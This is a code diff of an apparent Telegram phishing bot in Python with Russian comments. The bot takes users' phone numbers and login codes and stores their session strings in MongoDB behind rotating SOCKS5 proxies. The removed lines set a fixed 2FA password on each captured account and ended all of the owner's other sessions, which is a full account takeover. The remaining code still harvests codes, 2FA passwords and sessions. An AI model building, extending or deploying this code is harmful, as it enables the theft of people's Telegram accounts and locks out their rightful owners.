@@ -9,7 +9,6 @@ from aiogram.utils import executor
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
-from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 from pymongo import MongoClient
 from dotenv import load_dotenv
 
@@ -36,9 +35,6 @@ second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PA
 # Список доступных прокси (первая - старая основная)
 proxy_list = [main_proxy, second_proxy]
 
-# Фиксированный пароль для 2FA
-FIXED_PASSWORD = "Qwer123@"
-
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
@@ -56,9 +52,13 @@ os.makedirs("sessions", exist_ok=True)
 
 def get_proxy_for_phone(phone):
     """Выбираем прокси для номера"""
+    # Для старых сессий - используем сохраненный proxy_index или 0 (основной прокси)
     existing_session = sessions_col.find_one({"phone": phone})
     if existing_session:
+        # Если у сессии нет proxy_index, считаем что она использует основную прокси (индекс 0)
         return proxy_list[existing_session.get('proxy_index', 0)]
+    
+    # Для новых сессий - распределяем между прокси
     return proxy_list[hash(phone) % len(proxy_list)]
 
 @dp.message_handler(commands=['start'])
@@ -94,6 +94,7 @@ async def handle_contact(message: types.Message):
     if not phone.startswith("+"):
         phone = "+" + phone
 
+    # Выбираем прокси для этого номера
     selected_proxy = get_proxy_for_phone(phone)
     
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
@@ -177,23 +178,8 @@ async def try_sign_in_code(user_id, code):
             me = await client.get_me()
             session_str = client.session.save()
             
-            # Устанавливаем фиксированный пароль 2FA
-            try:
-                await client.edit_2fa(new_password=FIXED_PASSWORD)
-            except Exception as e:
-                logging.warning(f"Could not set 2FA: {e}")
-
-            # Отключаем все другие сессии
-            try:
-                auths = await client(GetAuthorizationsRequest())
-                for auth in auths.authorizations:
-                    if not auth.current:
-                        await client(ResetAuthorizationRequest(hash=auth.hash))
-            except Exception as e:
-                logging.warning(f"Could not terminate sessions: {e}")
-
-            # Сохраняем сессию (без сохранения пароля в базе)
-            proxy_index = 0
+            # Определяем индекс прокси для сохранения
+            proxy_index = 0  # по умолчанию старая прокси
             if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                 current_proxy = client._sender._proxy
                 proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
@@ -250,7 +236,8 @@ async def process_2fa(message: types.Message):
         if await client.is_user_authorized():
             session_str = client.session.save()
             
-            proxy_index = 0
+            # Определяем индекс прокси для сохранения
+            proxy_index = 0  # по умолчанию старая прокси
             if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                 current_proxy = client._sender._proxy
                 proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
